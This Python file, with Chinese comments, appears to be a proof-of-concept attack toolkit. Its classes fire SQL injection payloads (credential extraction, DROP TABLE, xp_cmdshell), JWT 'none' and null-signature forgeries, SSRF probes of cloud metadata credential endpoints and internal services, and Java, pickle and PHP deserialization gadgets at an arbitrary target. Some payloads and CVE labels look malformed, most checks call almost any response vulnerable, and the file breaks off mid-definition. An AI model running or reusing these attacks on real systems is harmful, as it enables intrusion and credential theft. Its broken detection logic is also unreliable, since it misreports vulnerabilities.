#!/usr/bin/env python3
"""
POC 模板基类

提供 POC 脚本的基本结构和通用方法
"""

import sys
import re
import json
import time
import hmac
import base64
import hashlib
import logging
import argparse
import urllib.parse
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field
from datetime import datetime
import requests

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger('POC')


@dataclass
class POCContext:
    target: str
    vuln_type: str
    file_path: str = ''
    line_number: int = 0
    code_snippet: str = ''
    additional_params: Dict[str, Any] = field(default_factory=dict)


class BasePOC:
    def __init__(self, context: POCContext):
        self.context = context
        self.results: List[Dict] = []
        self.session = requests.Session()
        self.session.verify = False
        self.timeout = 10

    def send_request(self, method: str, url: str, **kwargs) -> requests.Response:
        kwargs.setdefault('timeout', self.timeout)
        kwargs.setdefault('verify', False)
        kwargs.setdefault('allow_redirects', True)
        return self.session.request(method, url, **kwargs)

    def check_sql_error(self, response: requests.Response) -> Tuple[bool, str]:
        error_patterns = {
            'MySQL': [r'mysql', r'syntax.*error', r'you have an error in your sql'],
            'PostgreSQL': [r'postgresql', r'pg_', r'detailed error'],
            'Oracle': [r'ora-\d+', r'oracle.*error', r'pl/sql'],
            'SQLServer': [r'sql server', r'microsoft.*sql', r'cc\_number'],
            'SQLite': [r'sqlite', r'database.*error'],
            'Generic': [r'sql.*(error|exception)', r'syntax.*near', r'unterminated.*string']
        }
        text_lower = response.text.lower()
        for db_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, text_lower, re.IGNORECASE):
                    return True, db_type
        return False, ''

    def verify(self) -> Dict[str, Any]:
        raise NotImplementedError("子类必须实现 verify 方法")

    def generate_report(self) -> str:
        return json.dumps({
            'vuln_type': self.context.vuln_type,
            'target': self.context.target,
            'file_path': self.context.file_path,
            'line_number': self.context.line_number,
            'results': self.results,
            'exploitable': any(r.get('exploitable', False) for r in self.results)
        }, indent=2, ensure_ascii=False)


class SQLInjectionPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_union_based(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'UNION-based', 'payloads': [], 'exploitable': False}

        base_payloads = [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1--",
            "' UNION SELECT 1,2--",
            "' UNION SELECT 1,2,3--",
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 4--",
        ]

        column_detect_payloads = [
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM users--",
            "' UNION SELECT NULL,NULL,NULL,NULL FROM users--",
        ]

        data_exfil_payloads = [
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT NULL,username,NULL,password,NULL FROM users--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
        ]

        for payload in base_payloads:
            try:
                data = {param: payload} if param else {'q': payload}
                response = self.send_request('POST', target, data=data)

                has_error, db_type = self.check_sql_error(response)
                if has_error or response.status_code >= 500:
                    results['payloads'].append({
                        'payload': payload,
                        'db_type': db_type,
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"UNION检测到注入点: {payload}")
                    break
            except Exception as e:
                logger.debug(f"UNION payload失败: {payload} - {e}")

        for payload in column_detect_payloads:
            try:
                data = {param: payload} if param else {'q': payload}
                response = self.send_request('POST', target, data=data)

                if response.status_code == 200 and any(x in response.text for x in ['1', '2', '3', '4', '5']):
                    results['payloads'].append({
                        'payload': payload,
                        'response_code': response.status_code,
                        'column_detected': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    break
            except Exception as e:
                logger.debug(f"列检测失败: {payload} - {e}")

        return results

    def detect_boolean_blind(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Boolean-based blind', 'payloads': [], 'exploitable': False}

        true_payloads = [
            "' AND 1=1--",
            "' AND 1=1#",
            "'; SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' OR 1=1--",
        ]

        false_payloads = [
            "' AND 1=2--",
            "' AND 1=2#",
            "'; SELECT CASE WHEN 1=2 THEN 1 ELSE 0 END--",
            "' AND (SELECT COUNT(*) FROM users)=999999--",
        ]

        time_payloads = [
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
            "'; SELECT CASE WHEN (1=1) THEN sleep(5) ELSE sleep(0) END--",
        ]

        baseline_payload = "' AND 1=1--"
        try:
            data = {param: baseline_payload} if param else {'q': baseline_payload}
            baseline_response = self.send_request('POST', target, data=data)
            baseline_time = baseline_response.elapsed.total_seconds()
            baseline_len = len(baseline_response.text)
            baseline_status = baseline_response.status_code
        except Exception as e:
            logger.debug(f"基线请求失败: {e}")
            return results

        for true_payload in true_payloads:
            try:
                data = {param: true_payload} if param else {'q': true_payload}
                true_response = self.send_request('POST', target, data=data)

                is_true = (
                    true_response.status_code == baseline_status and
                    abs(len(true_response.text) - baseline_len) < 50
                )

                if is_true:
                    false_payload = true_payload.replace('1=1', '1=2').replace('1=1', '1=2')
                    data = {param: false_payload} if param else {'q': false_payload}
                    false_response = self.send_request('POST', target, data=data)

                    is_different = (
                        false_response.status_code != true_response.status_code or
                        abs(len(false_response.text) - len(true_response.text)) > 50
                    )

                    if is_different:
                        results['payloads'].append({
                            'true_payload': true_payload,
                            'false_payload': false_payload,
                            'response_diff': True,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"Boolean盲注检测到注入点: {true_payload}")
                        break
            except Exception as e:
                logger.debug(f"Boolean检测失败: {true_payload} - {e}")

        for time_payload in time_payloads:
            try:
                data = {param: time_payload} if param else {'q': time_payload}
                start_time = time.time()
                time_response = self.send_request('POST', target, data=data)
                elapsed = time.time() - start_time

                if elapsed >= 5:
                    results['payloads'].append({
                        'payload': time_payload,
                        'elapsed_time': elapsed,
                        'time_based': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"时间盲注检测到注入点: {time_payload}")
                    break
            except Exception as e:
                logger.debug(f"时间盲注检测失败: {time_payload} - {e}")

        return results

    def detect_time_based(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Time-based blind', 'payloads': [], 'exploitable': False}

        time_payloads = {
            'MySQL': [
                "'; SLEEP(5)--",
                "'; SELECT SLEEP(5)--",
                "'; BENCHMARK(5000000,MD5('test'))--",
            ],
            'PostgreSQL': [
                "'; pg_sleep(5)--",
                "'; SELECT pg_sleep(5)--",
                "'; (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            ],
            'SQLServer': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; IF (1=1) WAITFOR DELAY '00:00:05'--",
                "'; SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00' END--",
            ],
            'Oracle': [
                "'; DBMS_LOCK.SLEEP(5)--",
                "'; UTL_HTTP.REQUEST('http://example.com')--",
            ],
            'SQLite': [
                "'; RAISE(IGNORE)--",
            ],
        }

        baseline_payload = "'; SELECT 1--"
        try:
            data = {param: baseline_payload} if param else {'q': baseline_payload}
            baseline_start = time.time()
            self.send_request('POST', target, data=data)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0.5

        for db_type, payloads in time_payloads.items():
            for payload in payloads:
                try:
                    data = {param: payload} if param else {'q': payload}
                    start_time = time.time()
                    response = self.send_request('POST', target, data=data)
                    elapsed = time.time() - start_time

                    if elapsed >= 5 and elapsed > baseline_time * 3:
                        results['payloads'].append({
                            'payload': payload,
                            'db_type': db_type,
                            'elapsed_time': round(elapsed, 2),
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"时间盲注检测到注入点 [{db_type}]: {payload}")
                        return results
                except Exception as e:
                    logger.debug(f"时间盲注 [{db_type}] 检测失败: {payload} - {e}")

        return results

    def detect_stacked_queries(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Stacked queries', 'payloads': [], 'exploitable': False}

        stacked_payloads = [
            "'; SELECT 1;--",
            "'; SELECT 1,2,3;--",
            "'; DROP TABLE IF EXISTS test;--",
            "'; INSERT INTO users VALUES('test','test');--",
            "'; EXEC xp_cmdshell('whoami');--",
        ]

        for payload in stacked_payloads:
            try:
                data = {param: payload} if param else {'q': payload}
                response = self.send_request('POST', target, data=data)

                if response.status_code in [200, 500]:
                    has_error, db_type = self.check_sql_error(response)
                    if has_error or 'error' in response.text.lower():
                        results['payloads'].append({
                            'payload': payload,
                            'db_type': db_type,
                            'response_code': response.status_code,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"堆叠查询检测到注入点: {payload}")
                        break
            except Exception as e:
                logger.debug(f"堆叠查询检测失败: {payload} - {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始SQL注入检测: {target}")

        detection_results.append(self.detect_union_based(target, self.param))
        detection_results.append(self.detect_boolean_blind(target, self.param))
        detection_results.append(self.detect_time_based(target, self.param))
        detection_results.append(self.detect_stacked_queries(target, self.param))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'param': self.param,
            'detection_methods': len(detection_results)
        }


class AuthBypassPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_jwt_algorithm_manipulation(self, target: str) -> Dict[str, Any]:
        results = {'method': 'JWT algorithm manipulation', 'payloads': [], 'exploitable': False}

        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
        token = None

        try:
            response = self.send_request('GET', target)
            auth_header = response.headers.get('Authorization', '')
            if 'Bearer ' in auth_header:
                token = auth_header.split('Bearer ')[-1]
            elif not auth_header:
                cookies = response.cookies.get_dict()
                for key, value in cookies.items():
                    if len(value) > 50 and '.' in value:
                        token = value
                        break
        except Exception as e:
            logger.debug(f"JWT提取失败: {e}")
            return results

        if not token:
            return results

        try:
            parts = token.split('.')
            if len(parts) != 3:
                return results

            header_b64 = parts[0]
            payload_b64 = parts[1]

            header = json.loads(base64.urlsafe_b64decode(header_b64 + '=='))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '=='))

            algorithms_to_test = ['none', 'None', 'NONE', 'HS256', 'HS384', 'HS512']
            original_alg = header.get('alg', '')

            for alg in algorithms_to_test:
                if alg.lower() == 'none' or alg == original_alg:
                    continue

                try:
                    tampered_header = header.copy()
                    tampered_header['alg'] = alg

                    tampered_header_b64 = base64.urlsafe_b64encode(
                        json.dumps(tampered_header).encode()
                    ).decode().rstrip('=')
                    tampered_payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(payload).encode()
                    ).decode().rstrip('=')

                    tampered_token = f"{tampered_header_b64}.{tampered_payload_b64}."

                    test_endpoints = [
                        f"{target.rstrip('/')}/admin",
                        f"{target.rstrip('/')}/api/admin",
                        f"{target.rstrip('/')}/dashboard",
                    ]

                    for endpoint in test_endpoints:
                        resp = self.send_request('GET', endpoint, headers={'Authorization': f'Bearer {tampered_token}'})
                        if resp.status_code == 200:
                            results['payloads'].append({
                                'technique': 'algorithm_manipulation',
                                'original_alg': original_alg,
                                'tampered_alg': alg,
                                'token': tampered_token[:50] + '...',
                                'endpoint': endpoint,
                                'vulnerable': True
                            })
                            results['exploitable'] = True
                            logger.info(f"JWT算法manipulation检测到漏洞: {alg}")
                except Exception as e:
                    logger.debug(f"JWT算法测试失败 [{alg}]: {e}")

            none_variants = ['', 'none', 'None', 'NONE', 'nOn']
            for none_alg in none_variants:
                try:
                    none_header = {'alg': none_alg, 'typ': 'JWT'}
                    none_payload = payload.copy()

                    none_header_b64 = base64.urlsafe_b64encode(
                        json.dumps(none_header).encode()
                    ).decode().rstrip('=')
                    none_payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(none_payload).encode()
                    ).decode().rstrip('=')

                    none_token = f"{none_header_b64}.{none_payload_b64}."

                    for endpoint in test_endpoints:
                        resp = self.send_request('GET', endpoint, headers={'Authorization': f'Bearer {none_token}'})
                        if resp.status_code == 200:
                            results['payloads'].append({
                                'technique': 'none_algorithm',
                                'token': none_token[:50] + '...',
                                'endpoint': endpoint,
                                'vulnerable': True
                            })
                            results['exploitable'] = True
                            logger.info(f"JWT none算法检测到漏洞")
                except Exception as e:
                    logger.debug(f"JWT none测试失败: {e}")

        except Exception as e:
            logger.debug(f"JWT解析失败: {e}")

        return results

    def detect_jwt_null_signature(self, target: str) -> Dict[str, Any]:
        results = {'method': 'JWT null signature', 'payloads': [], 'exploitable': False}

        jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'

        try:
            response = self.send_request('GET', target)
            auth_header = response.headers.get('Authorization', '')
            token = None

            if 'Bearer ' in auth_header:
                token = auth_header.split('Bearer ')[-1]
            else:
                cookies = response.cookies.get_dict()
                for key, value in cookies.items():
                    if len(value) > 50 and '.' in value:
                        token = value
                        break

            if not token:
                return results

            parts = token.split('.')
            if len(parts) != 3:
                return results

            header_b64, payload_b64, _ = parts

            null_sig_variants = ['', '.', 'null', 'NULL', 'None']

            test_endpoints = [
                f"{target.rstrip('/')}/admin",
                f"{target.rstrip('/')}/api/admin",
                f"{target.rstrip('/')}/dashboard",
            ]

            for null_sig in null_sig_variants:
                try:
                    null_token = f"{header_b64}.{payload_b64}.{null_sig}"

                    for endpoint in test_endpoints:
                        resp = self.send_request('GET', endpoint, headers={'Authorization': f'Bearer {null_token}'})
                        if resp.status_code == 200:
                            results['payloads'].append({
                                'technique': 'null_signature',
                                'token': null_token[:50] + '...',
                                'endpoint': endpoint,
                                'vulnerable': True
                            })
                            results['exploitable'] = True
                            logger.info(f"JWT null signature检测到漏洞")
                except Exception as e:
                    logger.debug(f"JWT null signature测试失败: {e}")

        except Exception as e:
            logger.debug(f"JWT null signature检测失败: {e}")

        return results

    def detect_session_hijacking(self, target: str) -> Dict[str, Any]:
        results = {'method': 'Session hijacking', 'payloads': [], 'exploitable': False}

        try:
            response1 = self.send_request('GET', target)
            initial_cookies = response1.cookies.get_dict()

            if not initial_cookies:
                return results

            for cookie_name, cookie_value in initial_cookies.items():
                if any(x in cookie_name.lower() for x in ['session', 'token', 'auth', 'jwt', 'sess']):
                    test_endpoints = [
                        f"{target.rstrip('/')}/admin",
                        f"{target.rstrip('/')}/api/user/profile",
                        f"{target.rstrip('/')}/dashboard",
                    ]

                    for endpoint in test_endpoints:
                        resp = self.send_request('GET', endpoint, cookies={cookie_name: cookie_value})
                        if resp.status_code == 200:
                            results['payloads'].append({
                                'technique': 'session_reuse',
                                'cookie_name': cookie_name,
                                'cookie_value': cookie_value[:30] + '...',
                                'endpoint': endpoint,
                                'vulnerable': True
                            })
                            results['exploitable'] = True
                            logger.info(f"Session hijacking检测到漏洞: {cookie_name}")

            response2 = self.send_request('GET', target)
            new_cookies = response2.cookies.get_dict()

            for name in new_cookies:
                if name not in initial_cookies:
                    results['payloads'].append({
                        'technique': 'new_session_on_each_request',
                        'cookie_name': name,
                        'vulnerable': True
                    })
                    results['exploitable'] = True

        except Exception as e:
            logger.debug(f"Session hijacking检测失败: {e}")

        return results

    def detect_csrf_bypass(self, target: str) -> Dict[str, Any]:
        results = {'method': 'CSRF bypass', 'payloads': [], 'exploitable': False}

        csrf_endpoints = [
            f"{target.rstrip('/')}/api/user/update",
            f"{target.rstrip('/')}/api/profile/update",
            f"{target.rstrip('/')}/api/password/change",
            f"{target.rstrip('/')}/api/email/update",
        ]

        try:
            response = self.send_request('GET', target)
            csrf_token = None
            csrf_header = None

            csrf_patterns = [
                r'<input[^>]*name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'<input[^>]*value=["\']([^"\']+)["\'][^>]*name=["\']csrf_token["\']',
                r'csrf["\']?\s*:\s*["\']([^"\']+)["\']',
                r'_csrf["\']?\s*:\s*["\']([^"\']+)["\']',
            ]

            for pattern in csrf_patterns:
                match = re.search(pattern, response.text)
                if match:
                    csrf_token = match.group(1)
                    break

            if not csrf_token:
                csrf_header = response.headers.get('X-CSRF-Token') or response.headers.get('X-CSRFToken')

            for endpoint in csrf_endpoints:
                try:
                    test_response = self.send_request('POST', endpoint, data={'test': 'data'})

                    if test_response.status_code in [200, 302]:
                        if not csrf_token and not csrf_header:
                            results['payloads'].append({
                                'technique': 'missing_csrf_token',
                                'endpoint': endpoint,
                                'vulnerable': True
                            })
                            results['exploitable'] = True
                            logger.info(f"CSRF bypass检测到漏洞: {endpoint}")
                        else:
                            resp_no_token = self.send_request('POST', endpoint, data={'test': 'data'})
                            resp_with_token = self.send_request('POST', endpoint, data={'test': 'data', 'csrf_token': csrf_token or 'invalid'})

                            if resp_no_token.status_code == resp_with_token.status_code:
                                results['payloads'].append({
                                    'technique': 'csrf_token_not_validated',
                                    'endpoint': endpoint,
                                    'vulnerable': True
                                })
                                results['exploitable'] = True
                                logger.info(f"CSRF token未验证: {endpoint}")
                except Exception as e:
                    logger.debug(f"CSRF测试失败 [{endpoint}]: {e}")

        except Exception as e:
            logger.debug(f"CSRF bypass检测失败: {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始认证绕过检测: {target}")

        detection_results.append(self.detect_jwt_algorithm_manipulation(target))
        detection_results.append(self.detect_jwt_null_signature(target))
        detection_results.append(self.detect_session_hijacking(target))
        detection_results.append(self.detect_csrf_bypass(target))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'detection_methods': len(detection_results)
        }


class SSrfPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_dns_rebinding(self, target: str) -> Dict[str, Any]:
        results = {'method': 'DNS rebinding', 'payloads': [], 'exploitable': False}

        dns_rebinding_urls = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0x7f000001',
            'http://2130706433',
            'http://[::1]',
            'http://127.1',
            'http://127.0.1',
        ]

        for url in dns_rebinding_urls:
            try:
                response = self.send_request('GET', f"{target.rstrip('/')}/?url={urllib.parse.quote(url)}")

                if response.status_code in [200, 301, 302]:
                    if any(x in response.text.lower() for x in ['localhost', '127.0.0.1', 'apache', 'nginx', 'hello']):
                        results['payloads'].append({
                            'technique': 'dns_rebinding',
                            'url': url,
                            'response_code': response.status_code,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"DNS rebinding检测到漏洞: {url}")
            except Exception as e:
                logger.debug(f"DNS rebinding测试失败 [{url}]: {e}")

        return results

    def detect_gopher_protocol(self, target: str) -> Dict[str, Any]:
        results = {'method': 'Gopher protocol exploitation', 'payloads': [], 'exploitable': False}

        gopher_urls = [
            'gopher://127.0.0.1:6379/_INFO',
            'gopher://127.0.0.1:6379/_KEYS',
            'gopher://127.0.0.1:3306/_SELECT',
            'gopher://localhost:11211/_stats',
        ]

        for url in gopher_urls:
            try:
                response = self.send_request('GET', f"{target.rstrip('/')}/?url={urllib.parse.quote(url)}")

                if response.status_code in [200, 502, 503]:
                    results['payloads'].append({
                        'technique': 'gopher_protocol',
                        'url': url,
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"Gopher protocol检测到漏洞: {url}")
            except Exception as e:
                logger.debug(f"Gopher protocol测试失败: {e}")

        return results

    def detect_metadata_probing(self, target: str) -> Dict[str, Any]:
        results = {'method': 'Internal metadata probing', 'payloads': [], 'exploitable': False}

        metadata_endpoints = {
            'AWS': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/user-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/meta-data/instance-id',
            ],
            'GCP': [
                'http://metadata.google.internal/computeMetadata/v1/instance/disks',
                'http://metadata.google.internal/computeMetadata/v1/project/project-id',
            ],
            'Azure': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/attested/document?api-version=2021-11-01',
            ],
            'DigitalOcean': [
                'http://169.254.169.254/metadata/v1/id',
                'http://169.254.169.254/metadata/v1/user-data',
            ],
            'Alibaba': [
                'http://100.100.100.200/latest/meta-data/',
                'http://100.100.100.200/latest/user-data/',
            ],
        }

        for cloud_provider, endpoints in metadata_endpoints.items():
            for endpoint in endpoints:
                try:
                    response = self.send_request('GET', f"{target.rstrip('/')}/?url={urllib.parse.quote(endpoint)}")

                    if response.status_code == 200:
                        results['payloads'].append({
                            'technique': 'metadata_access',
                            'cloud_provider': cloud_provider,
                            'endpoint': endpoint,
                            'response_code': response.status_code,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"Metadata probing [{cloud_provider}]: {endpoint}")
                        break
                except Exception as e:
                    logger.debug(f"Metadata probing失败 [{cloud_provider}]: {e}")

        return results

    def detect_internal_network_probing(self, target: str) -> Dict[str, Any]:
        results = {'method': 'Internal network probing', 'payloads': [], 'exploitable': False}

        internal_ips = [
            ('10.0.0.1', '10.255.255.255'),
            ('172.16.0.1', '172.31.255.255'),
            ('192.168.0.1', '192.168.255.255'),
        ]

        internal_services = [
            'http://127.0.0.1:22',
            'http://127.0.0.1:23',
            'http://127.0.0.1:80',
            'http://127.0.0.1:443',
            'http://127.0.0.1:8080',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:5432',
            'http://127.0.0.1:6379',
            'http://127.0.0.1:27017',
            'http://127.0.0.1:11211',
        ]

        for service_url in internal_services:
            try:
                response = self.send_request('GET', f"{target.rstrip('/')}/?url={urllib.parse.quote(service_url)}", timeout=5)

                if response.status_code in [200, 301, 302, 400, 401, 403, 404, 500]:
                    results['payloads'].append({
                        'technique': 'internal_service',
                        'url': service_url,
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"Internal network probing: {service_url}")
            except requests.exceptions.Timeout:
                logger.debug(f"Internal service超时: {service_url}")
            except Exception as e:
                logger.debug(f"Internal network probing失败: {e}")

        return results

    def detect_protocol_smuggling(self, target: str) -> Dict[str, Any]:
        results = {'method': 'Protocol smuggling', 'payloads': [], 'exploitable': False}

        protocol_urls = [
            'dict://localhost:11211/stats',
            'sftp://localhost:22',
            'ldap://localhost:389',
            'tftp://localhost:69/test',
            'imap://localhost:143',
            'pop3://localhost:110',
            'smtp://localhost:25',
        ]

        for url in protocol_urls:
            try:
                response = self.send_request('GET', f"{target.rstrip('/')}/?url={urllib.parse.quote(url)}")

                if response.status_code in [200, 400, 500, 502, 503]:
                    results['payloads'].append({
                        'technique': 'protocol_smuggling',
                        'url': url,
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"Protocol smuggling检测到漏洞: {url}")
            except Exception as e:
                logger.debug(f"Protocol smuggling测试失败: {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始SSRF检测: {target}")

        detection_results.append(self.detect_dns_rebinding(target))
        detection_results.append(self.detect_gopher_protocol(target))
        detection_results.append(self.detect_metadata_probing(target))
        detection_results.append(self.detect_internal_network_probing(target))
        detection_results.append(self.detect_protocol_smuggling(target))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'param': self.param,
            'detection_methods': len(detection_results)
        }


class DeserializationPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_jackson_gadget_chain(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Jackson gadget chain', 'payloads': [], 'exploitable': False}

        jackson_payloads = [
            {
                'name': 'CVE-2017-17485',
                'data': '{" rnd": "net.sf.json.JSONObject {\"net.sf.json.JSONObject {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://localhost:1389/Exploit\", \"autoCommit\": true} }"}'
            },
            {
                'name': 'CVE-2019-12384',
                'data': '{" rnd": "com.fasterxml.jackson.databind.node.POJONode {\"@type\": \"java.lang.ProcessBuilder\", \"command\": [\"whoami\"]}"}'
            },
            {
                'name': 'CVE-2020-8840',
                'data': '{" rnd": {"@type": "com.alibaba.fastjson.JSONObject", "dataSourceName": "ldap://localhost:1389/Exploit"}}'
            },
            {
                'name': 'Generic JdbcRowSetImpl',
                'data': '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit","autoCommit":true}'
            },
            {
                'name': 'TemplatesImpl',
                'data': '{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64encoded"],"_name":"test"}'
            },
        ]

        content_type_headers = [
            {'Content-Type': 'application/json'},
            {'Content-Type': 'application/json;charset=UTF-8'},
        ]

        for payload in jackson_payloads:
            for headers in content_type_headers:
                try:
                    data = {param: payload['data']} if param else payload['data']
                    response = self.send_request('POST', target, data=data, headers=headers)

                    if any(x in response.text.lower() for x in ['error', 'exception', 'deserialize', 'classnotfound', 'invalid']):
                        results['payloads'].append({
                            'gadget': payload['name'],
                            'data': payload['data'][:50] + '...',
                            'response_code': response.status_code,
                            'error_detected': True,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"Jackson gadget chain检测到漏洞: {payload['name']}")
                except Exception as e:
                    logger.debug(f"Jackson gadget测试失败 [{payload['name']}]: {e}")

        return results

    def detect_java_serialization(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Java serialization', 'payloads': [], 'exploitable': False}

        base64_pattern = re.compile(r'^[A-Za-z0-9+/]+=*$')

        ysoserial_gadgets = [
            'URLDNS',
            'Groovy1',
            'BeanShell1',
            'C3P0',
            'Clojure',
            'CommonsBeanUtils1',
            'CommonsCollections1',
            'CommonsCollections2',
            'CommonsCollections3',
            'CommonsCollections4',
            'CommonsCollections5',
            'CommonsCollections6',
            'MozillaRhino1',
            'Spring1',
            'Spring2',
        ]

        serialization_markers = [
            b'ac ed',  # AC ED 00 05 - Java serialization magic bytes
            b'rO0',    # rO0AB - Base64 encoded Java serialization
            b'O:21:',  # O:21:" - PHP serialization
        ]

        test_payloads = [
            {'name': 'Java Serialized', 'data': 'rO0ABXQAVFxQcm9jZXNzQnVpbGRlci5jbGFzcw=='},
            {'name': 'URLDNS', 'data': 'yrO0ABXNyABNqYW1hLm5ldC5VUkwuRFNTLGphdmEubmV0LlVSTCREU1MAAAAAAAAAAAAAAA='},
        ]

        for payload in test_payloads:
            try:
                data = {param: payload['data']} if param else payload['data']
                response = self.send_request('POST', target, data=data)

                if response.status_code in [500, 400] or any(x in response.text.lower() for x in ['deserialize', 'serialization', 'classnotfoundexception']):
                    results['payloads'].append({
                        'gadget': payload['name'],
                        'data': payload['data'][:30] + '...',
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"Java serialization检测到漏洞: {payload['name']}")
            except Exception as e:
                logger.debug(f"Java serialization测试失败: {e}")

        return results

    def detect_python_pickle(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Python pickle deserialization', 'payloads': [], 'exploitable': False}

        pickle_payloads = [
            b"cnsubprocess\npopen\nIwhoami\ntp1\n.",
            b"cposix\nsystem\n(S'whoami'\ntR.",
            b"ctypes\ncdll\nc90s\nsystem\n(S'whoami'\ntR.",
        ]

        base64_pickle_payloads = [
            base64.b64encode(payload).decode() for payload in pickle_payloads
        ]

        for i, payload_b64 in enumerate(base64_pickle_payloads):
            try:
                data = {param: payload_b64} if param else payload_b64
                response = self.send_request('POST', target, data=data)

                if response.status_code in [200, 500]:
                    results['payloads'].append({
                        'gadget': f'pickle_{i}',
                        'data': payload_b64[:30] + '...',
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"Python pickle检测到漏洞")
            except Exception as e:
                logger.debug(f"Python pickle测试失败: {e}")

        return results

    def detect_php_unserialize(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'PHP unserialize', 'payloads': [], 'exploitable': False}

        php_payloads = [
            'O:4:"test":0:{}',
            'O:4:"test":1:{s:4:"test";s:4:"test";}',
            'a:1:{s:4:"test";s:4:"test";}',
            'C:4:"test":2:{ab}',
        ]

        for payload in php_payloads:
            try:
                data = {param: payload} if param else payload
                response = self.send_request('POST', target, data=data)

                if any(x in response.text.lower() for x in ['unserialize', 'error', 'exception', 'warning']):
                    results['payloads'].append({
                        'payload': payload,
                        'response_code': response.status_code,
                        'error_detected': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"PHP unserialize检测到漏洞")
            except Exception as e:
                logger.debug(f"PHP unserialize测试失败: {e}")

        return results

    def detect_ysoserial_style_payloads(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'ysoserial-style payloads', 'payloads': [], 'exploitable': False}

        gadget_chains = {
